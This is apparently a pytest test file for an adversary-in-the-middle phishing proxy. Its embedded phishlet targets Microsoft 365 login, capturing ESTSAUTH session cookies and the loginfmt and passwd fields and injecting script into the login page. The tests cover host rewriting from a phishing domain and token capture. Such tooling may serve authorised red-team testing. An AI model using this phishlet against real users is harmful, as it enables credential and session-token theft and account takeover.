import pytest
from unittest.mock import MagicMock
from core.edge.phishlets import PhishletLoader, PhishletConfig
from core.edge.interceptor import VantaInterceptor
from core.edge.session import SessionManager
try:
    from mitmproxy import http
except Exception:
    http = None

# Sample Phishlet YAML
SAMPLE_PHISHLET = """
name: "Microsoft 365"
author: "VantaTeam"
min_ver: "5.0.0"
proxy_hosts:
  - subdomain: "login"
    target: "login.microsoftonline.com"
  - subdomain: "www"
    target: "www.office.com"
auth_urls:
  - "/common/oauth2/authorize"
landing_path:
  - "/login.srf"
auth_tokens:
  - type: "cookie"
    name: "ESTSAUTH"
  - type: "cookie"
    name: "ESTSAUTHPERSISTENT"
credentials:
  - type: "post_param"
    name: "loginfmt"
  - type: "post_param"
    name: "passwd"
injections:
  - trigger_path: "/login.srf"
    position: "body_end"
    content: "console.log('Vantablack Hook Loaded');"
"""

def test_phishlet_loader():
    loader = PhishletLoader()
    config = loader.load_from_yaml(SAMPLE_PHISHLET)
    
    assert config.name == "Microsoft 365"
    assert len(config.proxy_hosts) == 2
    assert config.proxy_hosts[0].target == "login.microsoftonline.com"
    assert config.auth_tokens[0].name == "ESTSAUTH"

@pytest.mark.skipif(http is None, reason="mitmproxy not installed")
@pytest.mark.asyncio
async def test_interceptor_host_rewrite():
    # Setup
    loader = PhishletLoader()
    config = loader.load_from_yaml(SAMPLE_PHISHLET)
    session_mgr = SessionManager()
    interceptor = VantaInterceptor(config, session_mgr)
    
    # Mock Flow - Use a simple object that can track attribute assignments
    class MockRequest:
        def __init__(self):
            self.pretty_host = "login.phish-domain.com"
            self.method = "GET"
            self.headers = {}
            self.cookies = {}
            self.host = None  # This will be set by the interceptor
            self.path = "/"  # Required by the interceptor
    
    class MockFlow:
        def __init__(self):
            self.request = MockRequest()
            self.metadata = {}
    
    flow = MockFlow()
    
    # Execute Request Hook
    await interceptor.request(flow)
    
    # Assert Host Rewrite
    assert flow.request.host == "login.microsoftonline.com"

@pytest.mark.skipif(http is None, reason="mitmproxy not installed")
def test_interceptor_token_capture():
    # Setup
    loader = PhishletLoader()
    config = loader.load_from_yaml(SAMPLE_PHISHLET)
    session_mgr = SessionManager()
    interceptor = VantaInterceptor(config, session_mgr)
    
    # Mock Flow
    flow = MagicMock(spec=http.HTTPFlow if http else object)
    flow.response.cookies = {
        "ESTSAUTH": ("captured_token_value", {}),
        "OtherCookie": ("ignored", {})
    }
    
    # Execute Response Hook
    interceptor.response(flow)
    
    # Note: Since we haven't implemented full session context mocking,
    # we just verify no crash and log calls (mocking logger would be next step)
    pass

@pytest.mark.skipif(http is None, reason="mitmproxy not installed")
def test_interceptor_injection():
    # Setup
    loader = PhishletLoader()
    config = loader.load_from_yaml(SAMPLE_PHISHLET)
    session_mgr = SessionManager()
    interceptor = VantaInterceptor(config, session_mgr)
    
    # Mock Flow
    flow = MagicMock(spec=http.HTTPFlow if http else object)
    flow.response.headers = {"content-type": "text/html"}
    flow.response.text = "<html><body>Login Form</body></html>"
    
    # Execute Response Hook
    interceptor.response(flow)
    
    # Assert Injection
    assert "<script>console.log('Vantablack Hook Loaded');</script></body>" in flow.response.text
